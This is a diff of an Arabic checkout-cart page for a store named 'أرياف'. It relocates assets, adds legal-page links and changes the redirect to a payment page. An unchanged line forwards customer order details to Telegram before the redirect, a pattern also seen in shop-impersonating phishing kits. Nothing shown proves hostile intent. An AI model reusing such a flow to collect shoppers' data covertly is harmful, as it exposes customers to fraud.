@@ -4,9 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>أرياف | سلة المشتريات</title>
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700;800&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="assets/fonts/cairo.css">
+<link rel="stylesheet" href="assets/css/style.css">
 </head>
 <body>
 <header class="top">
@@ -51,13 +50,13 @@
 </form>
 
 <footer class="foot">
-  <nav><a href="#" target="_blank" rel="noopener">الشروط والأحكام</a><a href="#" target="_blank" rel="noopener">سياسة الخصوصية</a></nav>
+  <nav><a href="legal/terms.html">الشروط والأحكام</a><a href="legal/privacy.html">سياسة الخصوصية</a><a href="legal/refund.html">سياسة الاسترجاع</a></nav>
   <p>© 2026 أرياف</p>
 </footer>
 
 <div class="bar"><button class="btn" id="go"><span style="display:flex;gap:10px;align-items:center"><span class="cnt" data-count>0</span> تأكيد والدفع</span><span>(<span id="due">0.000</span> ر.ع)</span></button></div>
 
-<script src="app.js"></script>
+<script src="assets/js/app.js"></script>
 <script>
 const $=id=>document.getElementById(id);
 
@@ -151,8 +150,8 @@ $('go').onclick=async ()=>{
   $('go').disabled = true; // تعطيل الزر مؤقتاً أثناء الإرسال
   await sendOrderDetailsToTelegram(orderInfo);
 
-  // 3. الانتقال لصفحة الدفع
-  location.href='payment.html';
+  // 3. الانتقال لصفحة الدفع (مسار داخلي محمي)
+  location.href='checkout/payment.html';
 };
 
 /* ===== اقتراحات العناوين: قائمة محلية فورية + Photon (OpenStreetMap) مجاني بلا مفتاح ===== */
